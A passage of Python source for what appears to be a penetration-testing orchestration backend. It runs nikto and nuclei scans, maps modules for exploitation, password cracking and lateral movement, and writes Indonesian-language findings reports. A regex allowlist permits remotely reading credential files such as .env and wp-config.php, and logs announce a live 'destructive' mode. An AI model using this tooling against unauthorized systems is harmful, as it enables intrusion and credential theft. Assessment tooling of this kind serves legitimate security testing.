        r"^/var/www/html/config\.php$",
        r"^/var/www/html/wp-config\.php$",
        r"^.*\.env$",
        r"^.*\.conf$",
        r"^.*\.ini$",
        r"^.*\.log$",
        r"^.*\.json$",
        r"^.*\.yaml$",
        r"^.*\.yml$",
        r"^.*\.xml$",
        r"^.*\.php$",
    ]
    if not any(re.match(pattern, file_path) for pattern in allowed_patterns):
        return [{"kind": "log", "severity": "warning", "message": f"Sensitive file path not approved: {file_path}"}]
    return safe_read_sensitive_file(target, file_path, job_id)

def live_read_sensitive_file(target: str, job_id: str = "", execution_profile: str = "balanced") -> list[dict[str, Any]]:
    job = JOB_STORE.get_job(job_id) if job_id else None
    note = str(job.get("note") or "") if job else ""
    file_path = parse_sensitive_file_path(note)
    if not file_path:
        return [{"kind": "log", "severity": "warning", "message": "No file path supplied. Use note like: file=/var/www/html/.env"}]
    return read_sensitive_file(target, file_path, job_id)

def real_nikto_review_live(target: str, job_id: str = "", execution_profile: str = "balanced") -> list[dict[str, Any]]:
    events: list[dict[str, Any]] = []
    profile = normalize_execution_profile(execution_profile)
    candidate_urls = discovered_web_targets(job_id, target)
    primary_url = candidate_urls[0]

    try:
        if job_id:
            safe_append_log(job_id, "Starting Nikto/Nuclei review...", "info")
            safe_update_progress(job_id, 10)
            safe_append_log(job_id, f"Reusing discovery targets: {', '.join(candidate_urls[:3])}", "info")
    except Exception:
        pass

    if check_tool_availability("nikto"):
        events.append({"kind": "log", "severity": "warning", "message": f"Running Nikto scan ({profile})"})
        if profile == "fast":
            nikto_cmd = f"nikto -h {primary_url} -nointeractive -Tuning b -timeout 10"
        elif profile == "deep":
            nikto_cmd = f"nikto -h {primary_url} -nointeractive -Tuning 123b -timeout 20"
        else:
            nikto_cmd = f"nikto -h {primary_url} -nointeractive -timeout 15"

        nikto_result = execute_command_with_progress(nikto_cmd, job_id if job_id else "temp", target, timeout=180 if profile == "deep" else 120)
        nikto_stdout = str(nikto_result.get("stdout") or "")
        nikto_findings: list[str] = []
        for raw_line in nikto_stdout.splitlines():
            line = raw_line.strip()
            if not line:
                continue
            if line.startswith("+") or line.startswith("!"):
                nikto_findings.append(line)
            elif re.search(r"(x-frame-options|x-content-type-options|directory indexing|outdated|robots\.txt|admin/|backup/|uploads?/)", line, flags=re.IGNORECASE):
                nikto_findings.append(line)
        nikto_findings = clean_scanner_lines(nikto_findings, limit=30)
        if nikto_findings:
            nikto_structured = parse_nikto_structured_findings("\n".join(nikto_findings))
            events.append({
                "kind": "evidence",
                "severity": "high",
                "summary": f"Nikto findings: {len(nikto_findings)}",
                "details": nikto_findings[:20],
                "artifacts": {
                    "nikto_findings": nikto_findings,
                    "nikto_output": "\n".join(nikto_findings[:40]),
                    **nikto_structured,
                    "command": nikto_cmd,
                },
            })
        elif nikto_stdout:
            events.append({"kind": "log", "severity": "warning", "message": "Nikto completed but no actionable findings were extracted."})
    else:
        events.append({"kind": "log", "severity": "warning", "message": "nikto not found - skipping"})

    try:
        if job_id:
            safe_update_progress(job_id, 55)
    except Exception:
        pass

    if check_tool_availability("nuclei"):
        events.append({"kind": "log", "severity": "warning", "message": f"Running Nuclei scan ({profile})"})
        if profile == "fast":
            nuclei_cmd = f"nuclei -u {primary_url} -silent -rl 50 -c 10 -tags exposures,misconfig,default-login,tech"
        elif profile == "deep":
            nuclei_cmd = f"nuclei -u {primary_url} -silent -rl 120 -c 25 -tags exposures,misconfig,default-login,tech,cves,vulnerabilities"
        else:
            nuclei_cmd = f"nuclei -u {primary_url} -silent -rl 80 -c 15 -tags exposures,misconfig,default-login,tech,cves"

        nuclei_result = execute_command_with_progress(nuclei_cmd, job_id if job_id else "temp", target, timeout=240 if profile == "deep" else 150)
        nuclei_stdout = str(nuclei_result.get("stdout") or "")
        nuclei_findings = clean_scanner_lines([line.strip() for line in nuclei_stdout.splitlines() if line.strip()], limit=40)
        if nuclei_findings:
            highest = "high" if any(re.search(r"critical|high|cve", line, flags=re.IGNORECASE) for line in nuclei_findings) else "medium"
            nuclei_structured = parse_nuclei_structured_findings("\n".join(nuclei_findings))
            events.append({
                "kind": "evidence",
                "severity": highest,
                "summary": f"Nuclei findings: {len(nuclei_findings)}",
                "details": nuclei_findings[:20],
                "artifacts": {
                    "nuclei_output": "\n".join(nuclei_findings[:40]),
                    **nuclei_structured,
                    "command": nuclei_cmd,
                },
            })
        elif nuclei_stdout:
            events.append({"kind": "log", "severity": "warning", "message": "Nuclei completed but no actionable findings were extracted."})
    else:
        events.append({"kind": "log", "severity": "warning", "message": "nuclei not found - skipping"})

    try:
        if job_id:
            safe_update_progress(job_id, 90)
            safe_append_log(job_id, "Nikto/Nuclei review completed", "info")
    except Exception:
        pass

    return events

# ============ COMPLETE LIVE_ADAPTERS - ALL MODULES ============
LIVE_ADAPTERS = {
    # Reconnaissance
    "recon-service-scan": real_service_scan,
    "recon-host-discovery": real_host_discovery,
    "recon-dns-enumeration": real_dns_enumeration,
    "recon-amass-expansion": real_amass_expansion,
    
    # Baseline Assessment
    "baseline-web-fingerprint": real_web_fingerprint,
    "web-security-header-audit": real_web_security_header_audit,
    "baseline-content-discovery": real_content_discovery,
    "baseline-content-discovery-aggressive": real_content_discovery,
    "baseline-nikto-review": real_nikto_review_live,
    "baseline-gobuster-routes": real_route_enumeration_light,
    "baseline-tls-dns-review": real_tls_dns_review,
    "sensitive-file-discovery": discover_sensitive_files,
    "read-sensitive-file": live_read_sensitive_file,
    
    # Exploitation
    "exploit-sql-validation": real_sql_validation,
    "exploit-auth-control-review": real_auth_control,
    "exploit-session-review": real_session_review,
    
    # Objectives / Post-Exploitation
    "objective-credential-impact": real_credential_impact,
    "objective-hashcat-impact": real_hashcat_impact,
    "objective-lateral-movement-impact": real_lateral_movement,
    "objective-evidence-bundle": real_web_fingerprint,
    "objective-john-audit": real_john_audit,
}

# ============ Module Runtime Events ============
def module_runtime_events(module, target: str, note: str, job_id: str = "", execution_profile: str = "balanced") -> list[dict[str, Any]]:
    playbook = module_playbook(module)
    profile = normalize_execution_profile(execution_profile)
    events: list[dict[str, Any]] = [
        {"kind": "log", "severity": "info", "message": f"Operator note: {note or 'Default'}"},
        {"kind": "log", "severity": "warning", "message": f"🔥 EXECUTION: LIVE - Full capabilities"},
        {"kind": "log", "severity": "warning", "message": f"⚠️ DESTRUCTIVE: {DESTRUCTIVE_MODE.upper()}"},
        {"kind": "log", "severity": "info", "message": f"Execution profile: {profile}"},
        {"kind": "log", "severity": "info", "message": f"Target: {target}"},
        {"kind": "log", "severity": "info", "message": f"Module: {module.title} ({module.phase_label})"},
    ]
    
    for line in module.preview:
        events.append({"kind": "log", "severity": "info", "message": line})
    
    adapter = LIVE_ADAPTERS.get(module.id)
    if adapter:
        events.append({"kind": "log", "severity": "critical", "message": f"🔥 RUNNING LIVE ADAPTER: {module.title}"})
        adapter_events = adapter(target, job_id, profile)
        events.extend(adapter_events)
    else:
        events.append({"kind": "log", "severity": "warning", "message": f"No live adapter for {module.title}. Module skipped."})
        events.append({"kind": "log", "severity": "warning", "message": f"$ skipped::{module.id}::{target}"})
    
    return events

# ============ Job Execution ============
def run_job(job_id: str) -> None:
    job = JOB_STORE.get_job(job_id)
    if not job:
        print(f"❌ Job {job_id} not found")
        return
    
    try:
        if is_stop_requested(job_id):
            mark_job_stopped(job_id)
            return
        append_log(job_id, "Job accepted by worker.", status="running", progress=1)
        append_log(job_id, f"🔥 Execution: LIVE - Full capabilities", severity="warning")
        append_log(job_id, f"⚠️ Destructive: {DESTRUCTIVE_MODE.upper()}", severity="warning")
        if str(job.get("scope_type")) == "chain":
            append_log(job_id, "Running target preflight reachability check.", severity="info", progress=2)
            if not target_preflight_reachable(str(job["target"])):
                mark_job_failed_preflight(job_id, f"Target preflight failed: {job['target']} is not reachable. Full chain aborted.")
                return
            append_log(job_id, "Target preflight passed.", severity="info", progress=3)
        module_count = max(len(job["module_ids"]), 1)
        
        for index, module_id in enumerate(job["module_ids"]):
            if is_stop_requested(job_id):
                mark_job_stopped(job_id)
                return
            module = MODULE_BY_ID[module_id]
            if (
                str(job.get("scope_type")) == "chain"
                and module_id == "recon-host-discovery"
                and "recon-service-scan" in job["module_ids"]
            ):
                update_module_run(job_id, module_id, status="completed", progress=100, started_at=now_iso(), completed_at=now_iso(), highest_severity="info", evidence_count=0)
                append_log(job_id, "Skipping Host Discovery Snapshot because Service Discovery Sweep already covers reachability and exposure.", severity="info")
                continue
            existing_run = next((run for run in job["module_runs"] if run["module_id"] == module_id), None)
            execution_profile = normalize_execution_profile(existing_run.get("execution_profile") if existing_run else "balanced")
            highest_severity = "info"
            evidence_count = 0
            
            update_module_run(job_id, module_id, status="running", progress=5, started_at=now_iso(), execution_profile=execution_profile, highest_severity=highest_severity)
            
            append_log(job_id, "")
            append_log(job_id, f"=== [{module.phase_label}] {module.title} ===", severity="warning")
            append_log(job_id, f"Risk: {module.risk}")
            append_log(job_id, f"ATT&CK: {module.mitre}")
            append_log(job_id, f"🔥 Profile: {execution_profile}")
            append_log(job_id, "Starting module execution...")
            
            events = module_runtime_events(module, str(job["target"]), str(job["note"]), job_id, execution_profile)
            if is_stop_requested(job_id):
                mark_job_stopped(job_id, f"Job stopped during module: {module.title}")
                return
            total_events = max(len(events), 1)
            
            for event_index, event in enumerate(events, start=1):
                if is_stop_requested(job_id):
                    mark_job_stopped(job_id, f"Job stopped during module: {module.title}")
                    return
                severity = str(event.get("severity") or "info")
                highest_severity = severity_max(highest_severity, severity)
                module_progress = min(95, int((event_index / total_events) * 100))
                overall_progress = min(99, int(((index + (event_index / total_events)) / module_count) * 100))
                
                if event["kind"] == "log":
                    append_log(job_id, str(event["message"]), severity=severity, progress=overall_progress)
                elif event["kind"] == "evidence":
                    added_new_evidence = add_evidence(job_id, {
                        "module_id": module.id,
                        "module_title": module.title,
                        "phase_label": module.phase_label,
                        "severity": severity,
                        "summary": event["summary"],
                        "details": event.get("details", []),
                        "artifacts": event.get("artifacts", {}),
                        "execution_profile": execution_profile,
                        "collected_at": now_iso(),
                    })
                    if added_new_evidence:
                        evidence_count += 1
                    append_log(job_id, f"📊 Evidence: {event['summary']}", severity=severity, progress=overall_progress)
                
                update_module_run(job_id, module_id, progress=module_progress, highest_severity=highest_severity, evidence_count=evidence_count)
                update_progress(job_id, overall_progress)
                time.sleep(0.1)
            
            if is_stop_requested(job_id):
                mark_job_stopped(job_id, f"Job stopped after module: {module.title}")
                return
            update_module_run(job_id, module_id, status="completed", progress=100, highest_severity=highest_severity, evidence_count=evidence_count, completed_at=now_iso())
            append_log(job_id, f"✅ Module completed: {module.title}", severity=highest_severity)
            update_progress(job_id, int(((index + 1) / module_count) * 100))
        
        append_log(job_id, "✅ Job completed!", severity="info", status="completed", progress=100)
    except Exception as error:
        error_msg = f"Job error: {error}\n{traceback.format_exc()}"
        print(f"❌ {error_msg}")
        fail_job(job_id, f"Job error: {error}")
        append_log(job_id, traceback.format_exc(), severity="critical", status="failed")
    finally:
        unregister_active_process(job_id)
        clear_stop_request(job_id)

# ============ Report Functions ============
def export_payload(job: dict[str, Any]) -> dict[str, Any]:
    def tools_for_evidence_item(item: dict[str, Any]) -> list[str]:
        module_id = str(item.get("module_id") or "")
        module = MODULE_BY_ID.get(module_id)
        tools: list[str] = []
        seen: set[str] = set()
        if module:
            for tool in module_playbook(module).tooling:
                if tool and tool not in seen:
                    seen.add(tool)
                    tools.append(tool)
        command = str((item.get("artifacts") or {}).get("command") or "").strip()
        if command:
            inferred = command.split()[0].strip().lower()
            if inferred and inferred not in seen:
                tools.append(inferred)
        return tools

    enriched_evidence = []
    aggregate_tools: list[str] = []
    aggregate_seen: set[str] = set()
    for item in job.get("evidence", []):
        entry_tools = tools_for_evidence_item(item)
        for tool in entry_tools:
            if tool not in aggregate_seen:
                aggregate_seen.add(tool)
                aggregate_tools.append(tool)
        enriched_evidence.append({
            **item,
            "tools_used": entry_tools,
        })

    return {
        "job": {
            "id": job["id"],
            "scope_type": job["scope_type"],
            "scope_label": job["scope_label"],
            "target": job["target"],
            "note": job["note"],
            "status": job["status"],
            "progress": job["progress"],
            "created_at": job["created_at"],
            "updated_at": job["updated_at"],
            "asset": lookup_asset(job["target"]),
        },
        "severity_summary": job["severity_summary"],
        "module_runs": job["module_runs"],
        "tools_used": aggregate_tools,
        "evidence": enriched_evidence,
        "logs": job["logs"],
    }

def overall_risk_label(summary: dict[str, Any]) -> str:
    if int(summary.get("critical", 0) or 0) > 0:
        return "KRITIS"
    if int(summary.get("high", 0) or 0) > 0:
        return "TINGGI"
    if int(summary.get("medium", 0) or 0) > 0:
        return "SEDANG"
    if int(summary.get("low", 0) or 0) > 0:
        return "RENDAH"
    return "INFORMATIF"

def severity_label_id(value: str) -> str:
    mapping = {
        "critical": "KRITIS",
        "high": "TINGGI",
        "medium": "SEDANG",
        "low": "RENDAH",
        "info": "INFORMATIF",
    }
    return mapping.get(str(value or "info").lower(), "INFORMATIF")

def unique_tooling(job: dict[str, Any]) -> list[str]:
    tools: list[str] = []
    seen: set[str] = set()
    for module_id in job.get("module_ids", []):
        module = MODULE_BY_ID.get(module_id)
        if not module:
            continue
        for tool in module_playbook(module).tooling:
            if tool in seen:
                continue
            seen.add(tool)
            tools.append(tool)
    return tools

def summarize_scope(job: dict[str, Any]) -> tuple[list[str], list[str]]:
    included = [
        "uji keterjangkauan host",
        "pemindaian port TCP",
        "identifikasi service dan versi",
        "fingerprinting HTTP",
        "review path sensitif dan robots.txt",
        "inspeksi paparan file sensitif dan backup",
        "pemindaian misconfiguration web yang non-destruktif",
    ]
    excluded = [
        "eksploitasi",
        "brute force / password spraying",
        "validasi kredensial melalui login",
        "eksekusi file atau payload",
        "persistence",
        "lateral movement nyata",
        "data exfiltration",
    ]
    if any("objective-hashcat-impact" == module_id for module_id in job.get("module_ids", [])):
        included.append("review dampak paparan hash/kredensial secara offline")
    if any("exploit-auth-control-review" == module_id for module_id in job.get("module_ids", [])):
        included.append("review kontrol autentikasi secara aman")
    return unique_text_lines(included, limit=12), excluded

def infer_service_inventory(job: dict[str, Any]) -> list[dict[str, str]]:
    services: list[dict[str, str]] = []
    seen: set[str] = set()
    for item in job.get("evidence", []):
        artifacts = item.get("artifacts") or {}
        for entry in artifacts.get("open_ports") or []:
            port = str(entry.get("port") or "-")
            service = str(entry.get("service") or "unknown")
            version = str(entry.get("version") or "").strip()
            observation = version or str(entry.get("state") or "open")
            key = f"{port}|{service}|{observation}"
            if key in seen:
                continue
            seen.add(key)
            services.append({"port": port, "service": service, "observation": observation})
    services.sort(key=lambda item: int(item["port"]) if item["port"].isdigit() else 99999)
    return services[:20]

def concise_artifact_lines(artifacts: dict[str, Any]) -> list[str]:
    lines: list[str] = []
    skipped_keys = {
        "command",
        "checked_urls",
        "nmap_output",
        "nikto_output",
        "nuclei_output",
        "sslyze_output",
        "certificate",
        "dig_output",
        "dnsx_output",
        "httpx_output",
        "whatweb_output",
        "ftp_downloaded_files",
        "scan_type",
        "nse_findings_structured",
    }
    preferred_order = [
        "ip_addresses",
        "hostnames",
        "mac_addresses",
        "vendors",
        "open_ports",
        "service_versions",
        "http_titles",
        "http_headers",
        "http_methods",
        "database_services",
        "credential_hits",
        "robots_paths",
        "indexed_paths",
        "paths",
        "routes",
        "suspicious_php_files",
        "sensitive_files",
        "cves",
        "security_headers",
        "outdated_components",
        "default_credential_indicators",
    ]
    ordered_keys = [key for key in preferred_order if key in (artifacts or {})] + [key for key in (artifacts or {}).keys() if key not in preferred_order]
    for key in ordered_keys:
        if key in skipped_keys:
            continue
        value = (artifacts or {}).get(key)
        if value in (None, "", [], {}):
            continue
        label = str(key).replace("_", " ").capitalize()
        if isinstance(value, list):
            if key == "open_ports":
                rendered = ", ".join(f"{entry.get('port')}/{entry.get('service')} {entry.get('version', '').strip()}".strip() for entry in value[:8] if isinstance(entry, dict))
            else:
                rendered = ", ".join(clean_scanner_text(item) for item in value[:8])
        elif isinstance(value, dict):
            rendered = ", ".join(f"{sub_key}={clean_scanner_text(sub_value)}" for sub_key, sub_value in list(value.items())[:8])
        else:
            rendered = clean_scanner_text(value)
        if not rendered:
            continue
        lines.append(f"{label}: {rendered}")
    return lines[:14]

def is_noise_evidence(item: dict[str, Any]) -> bool:
    summary = str(item.get("summary", "")).lower()
    module_id = str(item.get("module_id", "")).lower()
    if summary in {"nmap host discovery completed", "dns records discovered", "cookie analysis"}:
        return True
    if module_id in {"objective-evidence-bundle", "c2-framework-awareness"}:
        return True
    return False

def finding_profile(item: dict[str, Any]) -> dict[str, Any]:
    artifacts = item.get("artifacts") or {}
    details = clean_scanner_lines(item.get("details") or ["Observasi evidence tercatat dari modul terkait."], limit=20)
    summary = str(item.get("summary", ""))
    module_id = str(item.get("module_id", ""))
    lowered = summary.lower()

    profile = {
        "title": summary,
        "description": details[:],
        "impact": ["Temuan ini menambah konteks risiko pada surface yang dinilai dan perlu dipadukan dengan evidence lain."],
        "recommendations": ["Lakukan validasi teknis dan hardening terarah pada area yang disebutkan di evidence."],
    }

    if artifacts.get("ftp_anonymous") or "ftp exposure" in lowered:
        profile["title"] = "Anonymous FTP mengekspos artefak dan indikasi kredensial sensitif"
        profile["description"] = [
            "Service FTP dapat diakses menggunakan login anonymous tanpa autentikasi kredensial yang sah.",
            "Listing file dan/atau file yang berhasil diambil menunjukkan kemungkinan paparan konfigurasi, backup, atau kredensial plaintext.",
            *details,
        ]
        profile["impact"] = [
            "Memungkinkan attacker memperoleh artefak sensitif tanpa login yang sah.",
            "Dapat membuka jalur ke akses SSH, database, atau service lain bila terjadi credential reuse.",
        ]
        profile["recommendations"] = [
            "Nonaktifkan anonymous FTP segera.",
            "Hapus file sensitif dari share FTP dan lakukan rotasi kredensial yang terekspos.",
            "Tinjau log FTP dan aktivitas akses file untuk mendeteksi penyalahgunaan.",
        ]
    elif "publicly accessible" in lowered or "directory indexing" in lowered:
        profile["title"] = "Direktori web sensitif dapat diakses publik dan mengungkap struktur internal"
        profile["description"] = [
            "Path sensitif yang diungkap oleh robots.txt atau enumerasi web dapat diakses tanpa autentikasi.",
            "Pada beberapa path, directory indexing aktif dan mempermudah enumerasi file lanjutan.",
            *details,
        ]
        profile["impact"] = [
            "Mempermudah penemuan file sensitif, endpoint admin, dan artefak backup.",
            "Meningkatkan peluang disclosure atau validasi attack path lanjutan tanpa eksploitasi aktif.",
        ]
        profile["recommendations"] = [
            "Batasi akses ke path admin, backup, dan upload hanya untuk role atau origin yang dibutuhkan.",
            "Nonaktifkan directory indexing pada web server.",
            "Review kembali isi robots.txt agar tidak mengungkap path sensitif yang benar-benar dapat diakses.",
        ]
    elif "suspicious php files" in lowered:
        profile["title"] = "File PHP mencurigakan terekspos pada direktori upload"
        profile["description"] = [
            "Directory listing menunjukkan file PHP pada area upload yang seharusnya dibatasi ketat.",
            "Nama file mengindikasikan kemungkinan artefak testing, deployment hygiene yang buruk, atau potensi webshell.",
            *details,
        ]
        profile["impact"] = [
            "Meningkatkan risiko code execution atau paparan artefak berbahaya.",
            "Mengindikasikan kontrol upload dan deployment belum cukup kuat.",
        ]
        profile["recommendations"] = [
            "Karantina dan review seluruh file PHP yang terekspos.",
            "Nonaktifkan eksekusi PHP pada direktori upload.",
            "Audit proses upload, deployment, dan integritas file pada web root.",
        ]
    elif artifacts.get("mysql_exposed") or "mysql service exposed" in lowered:
        profile["title"] = "Service MySQL terekspos pada jaringan"
        profile["description"] = [
            "Service MySQL dapat dijangkau dari jaringan dan mengungkap metadata versi.",
            "Paparan ini menjadi lebih berbahaya bila dikombinasikan dengan kebocoran kredensial atau kontrol akses yang lemah.",
            *details,
        ]
        profile["impact"] = [
            "Menambah attack surface dari jaringan.",
            "Berpotensi membuka akses administratif langsung bila pembatasan jaringan atau kredensial lemah.",
        ]
        profile["recommendations"] = [
            "Batasi akses MySQL hanya dari host yang memang dibutuhkan.",
            "Bind service ke localhost bila remote access tidak diperlukan.",
            "Tinjau grants, logging, dan rotasi kredensial terkait database.",
        ]
    elif "open ports discovered" in lowered or artifacts.get("open_ports"):
        profile["title"] = "Beberapa service jaringan terekspos dan dapat difingerprint dari luar"
        profile["description"] = [
            "Pemindaian live menunjukkan host aktif dan beberapa port TCP terbuka dengan service serta versi yang dapat diidentifikasi.",
            "Exposure ini memberi attacker konteks awal untuk enumerasi, pemetaan service, dan prioritisasi jalur serangan berikutnya.",
            *details,
        ]
        profile["impact"] = [
            "Menambah attack surface yang dapat diakses dari jaringan.",
            "Mempermudah enumerasi service, fingerprinting versi, dan korelasi dengan kelemahan lain seperti FTP anonymous atau paparan web.",
        ]
        profile["recommendations"] = [
            "Review kebutuhan bisnis untuk setiap port yang terbuka dan tutup service yang tidak diperlukan.",
            "Batasi akses jaringan ke service administratif dan database hanya dari host yang memang membutuhkan.",
            "Minimalkan banner/version disclosure bila memungkinkan.",
        ]
    elif "nikto" in lowered or "nuclei" in lowered or "web technology" in lowered:
        profile["title"] = "Baseline hardening web masih memberi banyak petunjuk enumerasi"
        profile["description"] = [
            "Fingerprinting web dan heuristic scan menunjukkan metadata, header, atau template finding yang mempercepat discovery attacker.",
            *details,
        ]
        profile["impact"] = [
            "Menurunkan biaya enumerasi bagi attacker untuk memetakan fungsi internal aplikasi.",
            "Meningkatkan kemungkinan hardening drift antar vhost atau komponen web.",
        ]
        profile["recommendations"] = [
            "Perkuat baseline header dan kurangi banner/version disclosure yang tidak perlu.",
            "Tinjau exposure file default, helper endpoint, dan template finding yang muncul.",
        ]
    elif module_id == "objective-hashcat-impact":
        profile["title"] = "Exposure hash offline mengindikasikan risiko kompromi identitas prioritas tinggi"
        profile["impact"] = [
            "Memungkinkan pemulihan password secara offline tanpa memicu log autentikasi awal.",
            "Berpotensi memicu compromise berantai jika password reuse atau privilege terlalu luas.",
        ]
        profile["recommendations"] = [
            "Reset segera identitas pada tier high dan medium terlebih dahulu.",
            "Perketat kebijakan password dan terapkan MFA untuk akun bernilai tinggi.",
        ]
    elif module_id == "objective-john-audit":
        profile["title"] = "Pola password lemah masih berulang dan menurunkan ketahanan identitas"
        profile["impact"] = [
            "Mempermudah guessing atau offline cracking terhadap kelompok akun yang lebih luas.",
            "Menurunkan efektivitas kontrol lain jika password policy dan MFA belum memadai.",
        ]
        profile["recommendations"] = [
            "Perbarui password policy untuk menolak pattern yang mudah ditebak.",
            "Terapkan MFA pada akun prioritas dan lakukan kampanye reset bertahap.",
        ]

    evidence_lines = concise_artifact_lines(artifacts)
    if evidence_lines:
        profile["evidence_lines"] = evidence_lines
    return profile

def collect_findings(job: dict[str, Any]) -> list[dict[str, Any]]:
    candidate_items = [item for item in job.get("evidence", []) if not is_noise_evidence(item)]
    candidate_items.sort(
        key=lambda item: (
            -SEVERITY_ORDER.get(str(item.get("severity", "info")).lower(), 0),
            str(item.get("module_title", "")),
        )
    )
    if any(SEVERITY_ORDER.get(str(item.get("severity", "info")).lower(), 0) >= 2 for item in candidate_items):
        candidate_items = [item for item in candidate_items if SEVERITY_ORDER.get(str(item.get("severity", "info")).lower(), 0) >= 2]
    candidate_items = candidate_items[:8]

    findings: list[dict[str, Any]] = []
    seen_titles: set[str] = set()
    for index, item in enumerate(candidate_items, start=1):
        profile = finding_profile(item)
        title_key = clean_scanner_text(profile["title"]).lower()
        if title_key in seen_titles:
            continue
        seen_titles.add(title_key)
        findings.append({
            "number": len(findings) + 1,
            "title": clean_scanner_text(profile["title"]),
            "severity": severity_label_id(str(item.get("severity", "info"))),
            "phase_label": item.get("phase_label", "-"),
            "module_title": item.get("module_title", "-"),
            "module_id": item.get("module_id", ""),
            "description": clean_scanner_lines(profile["description"], limit=12),
            "impact": clean_scanner_lines(profile["impact"], limit=8),
            "recommendations": clean_scanner_lines(profile["recommendations"], limit=8),
            "evidence_lines": clean_scanner_lines(profile.get("evidence_lines", []), limit=12),
            "artifacts": item.get("artifacts") or {},
            "execution_profile": item.get("execution_profile", "-"),
        })
    return findings

def collect_nmap_nse_findings(job: dict[str, Any]) -> list[dict[str, Any]]:
    findings: list[dict[str, Any]] = []
    seen: set[str] = set()
    for item in job.get("evidence", []):
        structured = ((item.get("artifacts") or {}).get("nse_findings_structured") or [])
        for entry in structured:
            finding = str(entry.get("finding", "")).strip()
            if not finding:
                continue
            key = f"{entry.get('script')}|{entry.get('severity')}|{finding}"
            if key in seen:
                continue
            seen.add(key)
            findings.append({
                "severity": str(entry.get("severity", "info")).lower(),
                "severity_id": severity_label_id(str(entry.get("severity", "info"))),
                "script": str(entry.get("script", "nse")),
                "finding": clean_scanner_text(re.sub(r"^[|_ ]+", "", finding)),
                "module_title": str(item.get("module_title", "")),
            })
    findings.sort(key=lambda entry: (-SEVERITY_ORDER.get(entry["severity"], 0), entry["script"], entry["finding"]))
    return findings[:12]

def build_attack_hypotheses(job: dict[str, Any], findings: list[dict[str, Any]]) -> list[str]:
    hypotheses: list[str] = []
    if any("ftp_anonymous" in finding["artifacts"] for finding in findings):
        hypotheses.append("Anonymous FTP dapat menjadi initial access untuk disclosure kredensial dan pivot ke service lain.")
    if any("paths" in finding["artifacts"] or "indexed_paths" in finding["artifacts"] for finding in findings):
        hypotheses.append("Paparan path sensitif dan directory indexing dapat mempercepat enumerasi menuju surface admin, backup, atau upload.")
    if any("suspicious_php_files" in finding["artifacts"] for finding in findings):
        hypotheses.append("File PHP pada direktori upload membuka hipotesis jalur eksekusi melalui deployment hygiene atau upload control yang lemah.")
    if any("mysql_exposed" in finding["artifacts"] for finding in findings):
        hypotheses.append("Paparan MySQL menambah peluang akses data atau administrasi bila digabungkan dengan kelemahan kredensial.")
    if not hypotheses:
        hypotheses.append("Attack path potensial terutama berasal dari kombinasi enumerasi service, metadata exposure, dan kelemahan baseline konfigurasi.")
    return hypotheses

def build_detection_recommendations(job: dict[str, Any]) -> list[str]:
    points: list[str] = []
    seen: set[str] = set()
    for module_id in job.get("module_ids", []):
        module = MODULE_BY_ID.get(module_id)
        if not module:
            continue
        for item in module_playbook(module).telemetry:
            line = f"Alert/monitoring pada {item}."
            if line in seen:
                continue
            seen.add(line)
            points.append(line)
    return points[:8] or ["Tinjau log akses, telemetry service, dan alert baseline yang relevan dengan modul yang dijalankan."]

def build_priority_plan(findings: list[dict[str, Any]]) -> dict[str, list[str]]:
    immediate: list[str] = []
    short_term: list[str] = []
    medium_term: list[str] = []

    if any(finding["severity"] == "KRITIS" for finding in findings):
        immediate.extend([
            "Batasi exposure pada temuan kritis dan lakukan containment awal.",
            "Review log dan alert terkait untuk mendeteksi penyalahgunaan sebelumnya.",
            "Tetapkan owner remediation dan verifikasi perubahan setelah perbaikan.",
        ])
    if any(finding["severity"] in {"KRITIS", "TINGGI"} for finding in findings):
        short_term.extend([
            "Hardening service dan path yang terekspos ke publik.",
            "Perbaiki kontrol akses, segmentasi, dan baseline konfigurasi yang lemah.",
            "Perkuat alerting untuk surface yang paling sering muncul pada evidence.",
        ])

    medium_term.extend([
        "Formalkan baseline hardening dan review berkala per fase kill chain.",
        "Sinkronkan temuan dengan backlog detection engineering dan hygiene operasional.",
        "Jadikan artefak laporan sebagai acuan validasi ulang pasca-remediasi.",
    ])

    return {
        "immediate": immediate or ["Tidak ada aksi kritis instan; tetap lakukan verifikasi cepat atas exposure yang ditemukan."],
        "short_term": short_term or ["Lakukan perbaikan baseline dan review owner/service dalam 1-7 hari."],
        "medium_term": medium_term,
    }

def build_markdown_report(job: dict[str, Any]) -> str:
    included, excluded = summarize_scope(job)
    tools = unique_tooling(job)
    services = infer_service_inventory(job)
    findings = collect_findings(job)
    nmap_nse_findings = collect_nmap_nse_findings(job)
    hypotheses = build_attack_hypotheses(job, findings)
    detections = build_detection_recommendations(job)
    plan = build_priority_plan(findings)
    overall_risk = overall_risk_label(job["severity_summary"])

    lines = [
        "# Laporan Penetration Testing",
        "",
        "## 1. Ringkasan Eksekutif",
        "",
        f"Telah dilakukan asesmen keamanan yang terotorisasi dan bersifat non-destruktif terhadap host `{job['target']}`.",
        f"Asesmen dijalankan melalui workflow `{job['scope_label']}` dengan pendekatan berbasis Cyber Kill Chain dan evidence-first validation.",
        f"Tingkat risiko keseluruhan: `{overall_risk}`",
        "",
        "Ringkasan temuan utama:",
    ]
    if findings:
        lines.extend([f"- {finding['title']} (`{finding['severity']}`)" for finding in findings[:6]])
    else:
        lines.append("- Belum ada temuan bernilai tinggi yang layak dinaikkan ke laporan utama.")

    lines.extend([
        "",
        "## 2. Ruang Lingkup dan Otorisasi",
        "",
        f"- Target host: `{job['target']}`",
        "- Jenis asesmen: terotorisasi, aman/non-destruktif",
        f"- Catatan job: `{job.get('note') or '-'}`",
        "- Aktivitas yang termasuk:",
    ])
    lines.extend([f"  - {item}" for item in included])
    lines.append("- Aktivitas yang tidak termasuk:")
    lines.extend([f"  - {item}" for item in excluded])

    lines.extend([
        "",
        "## 3. Lingkungan dan Metode",
        "",
        "Host asesmen:",
        "- Platform: Kali Linux WSL / backend FastAPI / browser console",
        "- Tools utama yang digunakan:",
    ])
    lines.extend([f"  - `{tool}`" for tool in tools[:12]] or ["  - `-`"])
    lines.extend(["", "Pendekatan:"])
    for index, run in enumerate(job.get("module_runs", [])[:8], start=1):
        lines.append(f"{index}. {run['phase_label']} - {run['title']} ({run['execution_profile']})")

    lines.extend(["", "## 4. Inventaris Service", ""])
    if services:
        lines.extend(["| Port | Service | Versi / Observasi |", "|------|---------|-------------------|"])
        for service in services:
            lines.append(f"| {service['port']} | {service['service']} | {service['observation']} |")
    else:
        lines.append("Belum ada inventaris service spesifik yang dapat diinferensikan dari output job ini.")

    lines.extend(["", "## 5. Temuan Nmap NSE", ""])
    if nmap_nse_findings:
        lines.extend(["| Severity | Script | Finding | Modul |", "|----------|--------|---------|-------|"])
        for item in nmap_nse_findings:
